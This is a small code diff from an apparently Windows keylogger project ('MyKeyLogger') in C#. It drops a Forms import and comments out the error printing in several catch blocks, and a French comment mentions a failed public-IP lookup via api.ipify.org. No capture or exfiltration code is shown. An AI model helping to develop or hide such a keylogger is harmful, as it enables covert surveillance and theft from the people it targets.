@@ -2,7 +2,6 @@
 using System.IO;
 using System.Net;
 using System.Text;
-using System.Windows.Forms;
 
 namespace MyKeyLogger
 {
@@ -32,7 +31,7 @@ namespace MyKeyLogger
 			} catch (Exception ex){
 				
 				//Message d'erreur : Le nom distant n'a pas pu être résolu: 'api.ipify.org'
-				Console.WriteLine(ex.Message);
+				//Console.WriteLine(ex.Message);
 				
 			}
 
@@ -64,7 +63,7 @@ namespace MyKeyLogger
 					
 				} catch (Exception ex){
 					
-					Console.WriteLine(ex.Message);
+					//Console.WriteLine(ex.Message);
 					
 				}
 				
@@ -92,7 +91,7 @@ namespace MyKeyLogger
 					
 				} catch (Exception ex){
 					
-					Console.WriteLine(ex.Message);
+					//Console.WriteLine(ex.Message);
 					
 				}
 			
@@ -121,7 +120,7 @@ namespace MyKeyLogger
 		
 				} catch (Exception ex){
 
-						Console.WriteLine(ex.Message);
+						//Console.WriteLine(ex.Message);
 						
 				}
 			}
